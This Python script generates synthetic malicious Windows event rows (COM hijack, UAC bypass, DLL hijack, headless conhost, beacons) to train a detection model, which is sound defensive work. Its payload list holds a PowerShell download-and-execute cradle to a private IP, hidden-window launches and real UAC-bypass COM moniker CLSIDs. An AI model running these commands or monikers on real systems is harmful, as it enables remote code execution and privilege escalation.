"""
Malicious examples for binaries the corpus only ever shows as benign.

The attack corpus contains 1 malicious dllhost.exe signature, 1 malicious
ieinstal.exe and 0 malicious conhost.exe -- and in the training set all three
appear only loading signed DLLs from System32. So the model learned "this
binary is benign", which is a blind spot on real techniques: COM hijacking and
elevation-moniker UAC bypass (dllhost), DLL hijack UAC bypass (ieinstal),
hidden execution (conhost --headless).

No relabelling can fix a class of event that is absent, so these are
generated -- and generated as CONTRASTS with the existing benign rows: the same
binary, doing the thing that makes it malicious, so the model has to learn the
behaviour rather than the name. Every row is rendered through contract.render()
like every other class, and build_sft.py's action quarantine keeps them out of
the eval set.

    # ids are TX###: TB### is taken by the synthetic benign rows, and a
    # collision made the idempotent append silently skip 14 of 24 rows.
    python3 gen_blindspots.py --append train_final.jsonl train_final_5way.jsonl
"""

import argparse
import json
from pathlib import Path

from contract import pick_account, render, stable_rng
from signature import signature
import targets

SYS32 = "C:\\Windows\\System32"
PS = f"{SYS32}\\WindowsPowerShell\\v1.0\\powershell.exe"
# real COM elevation monikers abused for UAC bypass (UACME)
MONIKERS = ["{3E5FC7F9-9A51-4367-9063-A120244FBEC7}",   # CMSTPLUA
            "{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}",   # ColorDataProxy
            "{E9495B87-D950-4AB5-87A5-FF6D70BF3E90}"]   # FwCplLua
DLL_NAMES = ["msvcr100.dll", "version.dll", "wtsapi32.dll", "propsys.dll", "cryptbase.dll"]
PAYLOADS = ["-nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.14/a')",
            "-nop -c Start-Process cmd -WindowStyle Hidden",
            "-c \"Get-Content $env:TEMP\\s.txt | iex\""]


def home(user):
    return f"C:\\Users\\{user.split(chr(92))[-1]}"


def families(r):
    user = pick_account(r, r.choice(["local", "local", "domain"]))
    h = home(user)
    dll = r.choice(DLL_NAMES)
    tmpdir = f"{h}\\AppData\\Local\\Temp\\{r.choice(['IDC1.tmp','~DF2A.tmp','x7k'])}"
    return [
        ("dllhost COM hijack", "T1546.015", dict(
            EventID=7, Image=f"{SYS32}\\dllhost.exe", User=user, Signed="false",
            TargetFilename=f"{h}\\AppData\\Roaming\\Microsoft\\{dll}")),
        ("dllhost elevation moniker", "T1548.002", dict(
            EventID=1, Image=f"{SYS32}\\cmd.exe", CommandLine=f'"{SYS32}\\cmd.exe" /c start {tmpdir}\\run.bat',
            ParentImage=f"{SYS32}\\dllhost.exe",
            ParentCommandLine=f"{SYS32}\\DllHost.exe /Processid:{r.choice(MONIKERS)}", User=user)),
        ("ieinstal DLL hijack", "T1548.002", dict(
            EventID=7, Image="C:\\Program Files\\Internet Explorer\\ieinstal.exe", User=user,
            Signed="false", TargetFilename=f"{tmpdir}\\{dll}")),
        ("ieinstal spawns shell", "T1548.002", dict(
            EventID=1, Image=f"{SYS32}\\cmd.exe", CommandLine=f'"{SYS32}\\cmd.exe"',
            ParentImage="C:\\Program Files\\Internet Explorer\\ieinstal.exe",
            ParentCommandLine='"C:\\Program Files\\Internet Explorer\\ieinstal.exe" -Embedding',
            User=user)),
        ("conhost headless", "T1564.003", dict(
            EventID=1, Image=f"{SYS32}\\conhost.exe",
            CommandLine=f"{SYS32}\\conhost.exe --headless {PS} {r.choice(PAYLOADS)}",
            ParentImage=f"{SYS32}\\cmd.exe", ParentCommandLine=f'"{SYS32}\\cmd.exe"', User=user)),
        ("conhost network beacon", "T1071", dict(
            EventID=3, Image=f"{SYS32}\\conhost.exe", User=user,
            DestinationIp=f"10.0.{r.randint(1,9)}.{r.randint(2,250)}",
            DestinationPort=str(r.choice([4444, 8443, 1337, 9001, 3001])))),
    ]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--per-family", type=int, default=4)
    ap.add_argument("--append", nargs="*", default=[])
    ap.add_argument("--out", default="train_blindspots.jsonl")
    args = ap.parse_args()

    rows, n = [], 0
    for i in range(args.per_family):
        r = stable_rng(f"blindspot-{i}")
        for name, attck, fields in families(r):
            n += 1
            body = render(fields)
            rows.append({"id": f"TX{n:03d}", "name": name, "gold": "malicious",
                         "severity": "high", "event": body,
                         "provenance": {"source": "synthetic:gen_blindspots",
                                        "signature": signature(targets.parse(body)),
                                        "attck": attck,
                                        "rationale": f"contrast example: {name}"}})
    Path(args.out).write_text("".join(json.dumps(x) + "\n" for x in rows))
    print(f"wrote {args.out}: {len(rows)} rows")

    for path in args.append:
        p = Path(path)
        have = [json.loads(l) for l in p.read_text().splitlines() if l.strip()]
        ids = {x["id"] for x in have}
        new = [x for x in rows if x["id"] not in ids]      # idempotent
        p.write_text("".join(json.dumps(x, ensure_ascii=False) + "\n" for x in have + new))
        print(f"  {path}: +{len(new)} (now {len(have) + len(new)})")


if __name__ == "__main__":
    main()
